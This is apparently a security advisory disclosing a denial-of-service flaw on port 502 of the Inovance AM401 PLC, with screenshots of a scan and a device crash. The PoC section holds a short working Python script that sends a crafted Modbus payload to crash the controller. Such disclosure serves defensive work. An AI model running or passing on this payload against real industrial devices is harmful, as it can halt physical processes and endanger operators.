# Summary
There is a denial of service vulnerability in port 502 of Inovance AM401 PLC. An attacker can send a carefully constructed message to cause the PLC device to crash.

# Details

Connectivity test of the device:
![image](https://github.com/user-attachments/assets/c10898e0-f1ea-4453-9a02-318f157df6b6)


Nmap scans device ports:![image](https://github.com/user-attachments/assets/6f9f906f-79cc-4f75-b223-32c3a2c4e94b)


You can see that port 502 is open.

Then we run the script:![image](https://github.com/user-attachments/assets/10d6dcaa-3119-4a41-9e1c-68cab09f41a6)


Soon you will see the device crash.
![image](https://github.com/user-attachments/assets/ee9b668e-799c-4638-b2f0-2347e4bb7057)

![image](https://github.com/user-attachments/assets/85fa0d0a-6e4d-49c6-a2f8-ee6783c842c0)



# PoC
My host ip is `192.168.1.149` and the device's ip is `192.168.1.88`.

```py
import socket


data = "031100EEFF0504010063006403110000006B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B6B06010100610064F000630064F000009100000000000000"
data = bytes.fromhex(data)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.88",502))
s.send(data)

```

# Discoverer
ylqncepu@163.com

Li Chunan(804242129@qq.com)

https://github.com/N0zoM1z0

